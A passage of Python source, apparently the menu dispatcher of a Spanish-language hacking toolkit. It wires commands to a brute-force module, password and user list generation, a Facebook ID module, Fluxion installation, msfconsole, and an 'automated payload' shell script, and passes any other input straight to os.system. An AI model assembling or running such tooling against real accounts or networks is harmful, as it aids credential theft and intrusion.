        print('\n       listo se instalo con exito\n')
        creacion()
    elif usr_pas == 'set fb-id' :
        os.system('python2 modulos/ID-F-BOOK.py')
        creacion()
    elif usr_pas == 'create_new_pass' :
        create_new_Pass()
    elif usr_pas == 'create_new_user' :
        create_new_user()
    elif usr_pas == 'exit' :
        clear()
        colores()
        print ('\n--------Saludes un gusto adios-----\n\n')
        os.system('exit')
    elif usr_pas == 'clear' :
        clear()
        colores()
        creacion()
    elif usr_pas == 'use force_brute' :
        colores()
        print ('..........')
        time.sleep(0.50)
        print (' ..........' )
        time.sleep(0.50)
        print ('-----abriendo modulo-----')
        colores()
        time.sleep(0.50)
        print ('..........')
        time.sleep(0.50)
        print ('..........')
        time.sleep(0.50)
        clear()
        os.system('python3 modulos/mod_force.py')
        colores()
        creacion()
    elif usr_pas == 'create user list' :
        usuarios()
        print('Creado con exito ....')
        time.sleep(2)
        chmod()
        clear()
        creacion()
    elif usr_pas == 'create pass list' :
        password()
        print('Creado con exito .... ')
        time.sleep(2)
        chmod()
        clear()
        creacion()
    elif usr_pas == 'install fluxion' :
        fluxion()
        creacion()
    elif usr_pas == 'open msfconsole' :
        print('pleace wait ... execute msfconsole \n\n')
        os.system('msfconsole')
        creacion()
    elif usr_pas == 'create automated payload' :
        os.system('bash modulos/modsh/modulo_payload.sh')
        colores()
        creacion()
    elif usr_pas == 'sublime text install' :
        os.system('wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg | sudo apt-key add -')
        os.system('sudo apt-get install apt-transport-https')
        os.system('echo "deb https://download.sublimetext.com/ apt/stable/" | sudo tee /etc/apt/sources.list.d/sublime-text.list')
        creacion()
    elif usr_pas == 'tor-desktop install' :
        print ('''  
            Nota : Solo descargara el .tar.xz [en la ruta que lo establescas ]\n''')
        os.system('wget https://dist.torproject.org/torbrowser/10.0.10/tor-browser-linux64-10.0.10_en-US.tar.xz')
        inport = input(' Ruta a guardar tu .tar.xz => ')
        if inport == inport :
            os.system('mv tor-browser-linux64-10.0.10_en-US.tar.xz ' + inport)
    elif usr_pas == 'use Brute' :
        brutedum()
        clear()
        creacion()
    elif usr_pas == 'use check-pass' :
        os.system('python3 modulos/checkpass.py')
        input('\n\nPress enter para coontinuar\n')
        clear()
        creacion()
    elif usr_pas == usr_pas :
        os.system(usr_pas)
        colores()
        creacion()
    elif usr_pas != usr_pas :
        clear()
        print('\n\n error ')
        creacion()
creacion()
